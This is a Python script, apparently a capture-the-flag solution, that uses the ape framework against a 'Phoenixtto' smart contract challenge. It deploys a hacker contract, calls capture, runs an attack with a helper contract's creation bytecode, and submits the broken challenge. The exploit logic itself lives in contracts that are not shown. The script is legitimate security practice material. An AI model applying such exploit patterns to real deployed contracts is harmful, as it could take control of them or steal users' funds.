from ape import accounts, project
from .utils.helper import get_challenge_instance, challenge_broken

CHALLENGE_MANAGER = "0x157EB6396D44F63D3970a72C253BfB5ACEEc80dD"
CHALLENGE_FACTORY = "0xc092cbd1e25254C0aDF08b95DE7a633c1456aE83"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get challenge instance
    instance, eko = get_challenge_instance(
        CHALLENGE_MANAGER,
        CHALLENGE_FACTORY,
        user,
    )

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.Phoenixtto.deploy(instance, sender=user)

    # exploit goes here
    print("\n--- Exploiting challenge instance ---\n")
    phoenixtto = project.Phoenixtto.at(hacker.phoenixtto_address())
    phoenixtto.capture("HI", sender=user)

    creation_code = project.PhoenixttoHelper.contract_type.deployment_bytecode.bytecode
    hacker.attack(creation_code, sender=user)

    # submiting challenge instance
    print("\n--- Breaking challenge instance ---\n")
    submit_tx = eko.breakChallenge(CHALLENGE_FACTORY, sender=user)

    # checking if challenge is completed
    challenge_broken(eko, submit_tx, user.address, CHALLENGE_FACTORY)

    print("\n--- 🥂!CHALLENGE COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
